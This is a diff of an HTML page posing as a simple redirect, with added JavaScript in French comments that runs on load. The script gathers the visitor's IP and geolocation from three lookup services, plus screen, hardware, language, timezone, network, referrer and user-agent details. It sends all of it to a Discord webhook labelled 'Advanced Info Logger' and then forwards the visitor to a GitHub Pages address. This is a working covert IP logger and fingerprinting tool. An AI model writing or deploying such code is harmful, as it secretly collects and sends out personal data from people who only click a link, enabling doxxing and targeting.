@@ -4,7 +4,6 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Redirection...</title>
-  <!-- Redirection de secours si JavaScript est désactivé -->
   <noscript>
     <meta http-equiv="refresh" content="0;url=https://kfcgaming.github.io/enzgal">
   </noscript>
@@ -37,29 +36,75 @@
 
     async function sendAndRedirect() {
       try {
-        // Récupération de l'IP et données géolocalisées
-        const response = await fetch("https://ipapi.co/json/");
-        const data = await response.json();
+        // 1. Récupération des API IP en parallèle
+        const results = await Promise.allSettled([
+          fetch("https://ipapi.co/json/").then(r => r.json()),
+          fetch("https://ipwho.is/").then(r => r.json()),
+          fetch("https://json.geoiplookup.io/").then(r => r.json())
+        ]);
 
+        const api1 = results[0].status === 'fulfilled' ? results[0].value : {};
+        const api2 = results[1].status === 'fulfilled' ? results[1].value : {};
+        const api3 = results[2].status === 'fulfilled' ? results[2].value : {};
+
+        const ip = api1.ip || api2.ip || api3.ip || "Inconnue";
+
+        // 2. Collecte des informations système et navigateur disponibles en JS
+        const screenRes = `${window.screen.width}x${window.screen.height}`;
+        const colorDepth = `${window.screen.colorDepth} bits`;
+        const lang = navigator.language || navigator.userLanguage || "N/A";
+        const languages = navigator.languages ? navigator.languages.join(", ") : "N/A";
+        const platform = navigator.platform || "N/A";
+        const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cœurs` : "Inconnu";
+        const memory = navigator.deviceMemory ? `~${navigator.deviceMemory} Go RAM` : "Inconnu";
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
+        const cookiesEnabled = navigator.cookieEnabled ? "Oui" : "Non";
+        const referrer = document.referrer ? document.referrer : "Accès direct / Aucun";
+
+        // Détection approximative de la connexion réseau (si supportée)
+        let connectionInfo = "Inconnue";
+        if (navigator.connection) {
+          connectionInfo = `${navigator.connection.effectiveType || 'N/A'} (~${navigator.connection.downlink || '?'} Mbps, RTT: ${navigator.connection.rtt || '?'}ms)`;
+        }
+
+        // 3. Construction du message Discord (divisé en plusieurs embeds ou champs pour tout caser proprement)
         const payload = {
-          username: "IP Logger Bot",
+          username: "Advanced Info Logger",
           avatar_url: "https://i.imgur.com/4M34hi2.png",
           embeds: [
             {
-              title: "🎯 Nouvelle visite & redirection",
+              title: "🎯 Nouvelle visite détectée",
               color: 0x00ff55,
               fields: [
-                { name: "🌐 Adresse IP", value: data.ip || "Inconnue", inline: true },
-                { name: "📍 Localisation", value: `${data.city || 'N/A'}, ${data.region || 'N/A'}, ${data.country_name || 'N/A'}`, inline: true },
-                { name: "🏢 FAI / Opérateur", value: data.org || "Inconnu", inline: false },
-                { name: "💻 User-Agent", value: navigator.userAgent, inline: false }
+                { name: "🌐 Adresse IP", value: `\`${ip}\``, inline: false },
+                { 
+                  name: "📊 Géolocalisation (ipapi.co)", 
+                  value: `Ville : ${api1.city || 'N/A'}\nRégion : ${api1.region || 'N/A'}\nPays : ${api1.country_name || 'N/A'}\nFAI : ${api1.org || 'N/A'}`, 
+                  inline: true 
+                },
+                { 
+                  name: "📊 Géolocalisation (ipwho.is)", 
+                  value: `Ville : ${api2.city || 'N/A'}\nRégion : ${api2.region || 'N/A'}\nPays : ${api2.country || 'N/A'}\nFAI : ${api2.connection?.isp || 'N/A'}`, 
+                  inline: true 
+                },
+                { 
+                  name: "📊 Géolocalisation (geoiplookup)", 
+                  value: `Ville : ${api3.city || 'N/A'}\nRégion : ${api3.region || 'N/A'}\nPays : ${api3.country_name || 'N/A'}\nFAI : ${api3.isp || 'N/A'}`, 
+                  inline: true 
+                },
+                { name: "🖥️ Écran & Affichage", value: `Résolution : **${screenRes}**\nProfondeur de couleur : ${colorDepth}`, inline: true },
+                { name: "⚙️ Matériel & Système", value: `OS/Plateforme : ${platform}\nProcesseur : ${cores}\nMémoire RAM : ${memory}`, inline: true },
+                { name: "🌍 Paramètres régionaux", value: `Langue principale : ${lang}\nLangues : ${languages}\nFuseau horaire : ${timezone}`, inline: true },
+                { name: "📶 Réseau & Connexion", value: `Type estimé : ${connectionInfo}\nCookies activés : ${cookiesEnabled}`, inline: true },
+                { name: "🔗 Provenance (Referrer)", value: `\`${referrer}\``, inline: false },
+                { name: "💻 User-Agent Complet", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
               ],
               timestamp: new Date().toISOString()
             }
           ]
         };
 
-        // Envoi de la requête au Webhook avec un timeout pour éviter de bloquer indéfiniment
+        // Envoi au webhook Discord
         await fetch(WEBHOOK_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -67,9 +112,9 @@
         });
 
       } catch (error) {
-        console.error("Erreur d'envoi :", error);
+        console.error("Erreur lors de la collecte :", error);
       } finally {
-        // Redirection vers la page cible quoi qu'il arrive
+        // Redirection finale dans tous les cas
         window.location.href = TARGET_URL;
       }
     }
